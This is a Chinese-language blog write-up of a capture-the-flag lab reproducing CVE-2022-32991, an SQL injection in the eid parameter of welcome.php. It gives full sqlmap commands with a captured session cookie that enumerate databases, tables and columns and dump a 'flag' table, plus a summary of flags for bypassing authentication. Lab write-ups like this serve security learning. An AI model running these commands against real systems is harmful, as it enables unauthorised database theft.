---
title: CVE-2022-32991
subtitle:
date: 2025-03-14T13:11:14+08:00
slug: 85472c2
draft: false
author:
  name: T1ng
  link:
  email:
  avatar: /images/avater.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - CVE
categories:
  - 复现
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

<!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->

尝试注册账号，注册完成以后登录

![](images/0dab76148ac78a186c13d411543798f9.png)

根据提示

![](images/02ddae09f0f72d3d7ebbad4f0ad43799.png)

该SQL注入位于welcome.php处。但是参数根据CVE官方应该是通过eid参数的SQL注入，但是上述页面并不是eid参数，需要继续查找。

![](images/1755879bd17168ddc6869dda07eae1f8.png)

在此处发现eid参数

![](images/244f0196e4e82a542f3b56ad63d33d23.png)

抓包找到所需要的参数，因为该页面需要登录访问，所以需要获得Cookie绕过身份验证，并添加-user-agent参数绕过客户端验证。

![](images/8d563db15e5e04624d859a8fc73492df.png)



```
Cookie: PHPSESSID=25p9b92ovsqudtuepvmi7jgvma
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
```

Sqlmap进行攻击

```
 sqlmap -u "http://eci-2ze4fh5ffzlnoxzusgkd.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" --cookie="PHPSESSID=25p9b92ovsqudtuepvmi7jgvma" --batch --dbs
```

得到数据库

![](images/1a48213ec268f830405b986cd6745473.png)

爆出数据库以后，进行爆表

```
sqlmap -u "http://eci-2ze4fh5ffzlnoxzusgkd.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" --cookie="PHPSESSID=25p9b92ovsqudtuepvmi7jgvma" --batch -D "ctf" --tables
```



![](images/683694ef17178f038bc2277de14cf1ec.png)

得到表名再去爆破列名

```
sqlmap -u "http://eci-2ze4fh5ffzlnoxzusgkd.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" --cookie="PHPSESSID=25p9b92ovsqudtuepvmi7jgvma" --batch -D "ctf" -T "flag" --columns
```



![](images/1d577c691a349bbad1317a6a47772633.png)

继续爆破字段

```
sqlmap -u "http://eci-2ze4fh5ffzlnoxzusgkd.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" -p "eid" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" --cookie="PHPSESSID=25p9b92ovsqudtuepvmi7jgvma" --batch -D "ctf" -T "flag" -C "flag" --dump
```



![](images/eced71d2a9282e89527650a514d70945.png)



总结

```
--cookie                        #绕过身份验证
--random-agent或--user-agent    #绕过客户端验证
--batch                         #默认后续sqlmap操作都为Y
--p                             #指定sqlmap注入的传参参数
```
